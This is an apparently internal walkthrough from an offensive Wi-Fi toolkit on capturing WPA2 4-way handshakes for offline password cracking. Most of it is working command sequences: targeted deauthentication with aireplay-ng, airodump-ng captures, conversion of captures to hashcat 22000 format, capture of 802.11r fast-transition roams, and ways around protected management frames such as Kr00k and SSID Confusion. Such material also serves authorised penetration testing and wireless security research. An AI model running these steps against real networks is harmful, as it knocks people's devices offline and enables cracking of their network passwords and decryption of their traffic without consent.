# 4-way handshake — walkthrough

**Verified against:** aircrack-ng 1.7 + hcxdumptool 7.3 as of 2026-Q3

Corner cases beyond the wpa2 fast path. Reach for these when the
straightforward `airodump-ng + aireplay -0` doesn't yield a usable
capture.

## Path A — Full-4 capture for offline decrypt

You need this if you plan to Wireshark-decrypt data frames after
recovering the PSK. Any two adjacent messages hashcat-crack the PSK,
but Wireshark's PTK derivation needs all four.

```
# 1. Lock the channel.
iw dev wlan1mon set channel 6

# 2. Broad capture — save everything, filter later.
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w /tmp/full4 wlan1mon &

# 3. Targeted deauth — 3 reason-7 frames is enough for most clients.
aireplay-ng -0 3 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan1mon

# 4. Confirm all four:
tshark -r /tmp/full4-01.cap -Y "eapol" -T fields -e wlan.sa -e wlan.da \
       -e eapol.type -e wlan.rsn.ie.pmkid
# Expect four EAPOL frames alternating M1/M2/M3/M4.
```

## Path B — M2+M3 capture (M1 missed)

Sometimes airodump misses M1 because it started mid-handshake.
`hcxpcapngtool` will still yield a 22000 line from M2+M3:

```
hcxpcapngtool -o /tmp/hs.22000 /tmp/partial.pcapng
grep '^WPA\*02' /tmp/hs.22000
```

`WPA*02` = 4-way handshake capture. The MIC in M2 (and M3) is what
hashcat validates.

## Path C — FT reassoc capture (802.11r)

When a client roams between two APs in the same Mobility Domain, the
FT reassociation frames carry an M1-analogue. hashcat 22000 handles
this the same as a regular capture.

```
# 1. Identify FT: RSN Mobility Domain Element (MDE, IE 54) in the beacon.
tshark -r beacon.pcapng -Y "wlan.tag.number == 54" \
       -T fields -e wlan.bssid -e wlan.mde.md_id

# 2. Force a roam (BTM Request) or wait for the natural one.
#    See attacks.json:btm-forced-roam.

# 3. Capture on the destination AP's channel.
airodump-ng -c <dest-channel> --bssid <dest-BSSID> -w /tmp/ft wlan1mon
```

Records: `ft-handshake-capture`, `ft-r0-shared-fleet-crack`.

## Path D — PMF-required target

If PMF-required is set and the client is PMF-capable, deauth/disassoc
from us are dropped. Options:

- **Wait for a natural reassoc.** Boot, roam, sleep-wake all trigger.
  Not fast, but reliable if the client cycles.
- **Trigger Kr00k.** If the client is Kr00k-vulnerable, disassoc still
  works and the *tail frame* leak is the goal. Different attack
  primitive but similar setup. See `kr00k/walkthrough.md`.
- **SSID Confusion.** If the client will honor an AP whose SSID
  differs but PSK matches, you don't need to knock it off the real AP.

## Path E — Convert legacy formats

Old captures may be `.cap` (aircrack-ng) or `.hccapx` (pre-2018
hashcat). Convert forward:

```
# .cap -> .pcapng (round-trip; airodump captures are already pcap)
editcap /tmp/legacy.cap /tmp/legacy.pcapng

# .cap or .pcapng -> 22000
hcxpcapngtool -o /tmp/hs.22000 /tmp/legacy.pcapng
```

## Failure modes

- **`hcxpcapngtool` reports 0 hashes.** Handshake incomplete, or
  driver stripped the RadioTap header. Rerun capture without any
  `--band` filter and inspect with wireshark.
- **Multiple ESSIDs in the pcap.** hcxpcapngtool emits one line per
  (AP,STA,ESSID). Filter with `--essid=<target>` before conversion.
- **PMF-required + no roam.** Path D is the answer.

## Cite

- IEEE Std 802.11-2020, §12.7 (4-Way Handshake), §12.11 (FT).
- hcxtools GitHub — hcxpcapngtool README.
- aircrack-ng documentation.
- attacks.json: `wpa2-4way-capture`, `ft-handshake-capture`.
